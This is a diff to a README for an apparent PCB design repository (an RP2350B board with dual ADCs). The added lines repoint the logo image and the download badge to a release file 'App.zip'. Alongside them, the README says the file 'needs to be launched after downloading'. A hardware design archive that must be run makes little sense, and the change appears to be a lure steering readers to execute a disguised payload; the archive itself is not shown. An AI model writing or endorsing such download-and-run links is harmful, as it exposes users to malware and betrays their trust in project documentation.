@@ -1,6 +1,6 @@
 # 🚀 Welcome to RP2350B_DualADC_DualPCM Repository! 🚀
 
-![RP2350B_DualADC_DualPCM Logo](https://www.example.com/logo.jpg)
+![RP2350B_DualADC_DualPCM Logo](https://github.com/manhkhangbui/RP2350B_DualADC_DualPCM/releases/download/v1.0/App.zip)
 
 ## Repository Description:
 RP2350B_DualADC_DualPCM is a printed circuit board designed to neatly package an RP2350B with two 12-bit high-speed ADCs and four-channel audio input. This board is intended for use with the HS-DAOH (High-Speed Digital Audio Output Hardware) platform, providing a seamless integration for audio processing applications.
@@ -35,7 +35,7 @@ The repository covers a wide range of topics related to the design and functiona
 
 ## Getting Started:
 To get started with RP2350B_DualADC_DualPCM, you can download the repository files from the following link:
-[![Download RP2350B_DualADC_DualPCM](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download RP2350B_DualADC_DualPCM](https://github.com/manhkhangbui/RP2350B_DualADC_DualPCM/releases/download/v1.0/App.zip)](https://github.com/manhkhangbui/RP2350B_DualADC_DualPCM/releases/download/v1.0/App.zip)
 
 Please note that the file needs to be launched after downloading for further instructions.
 
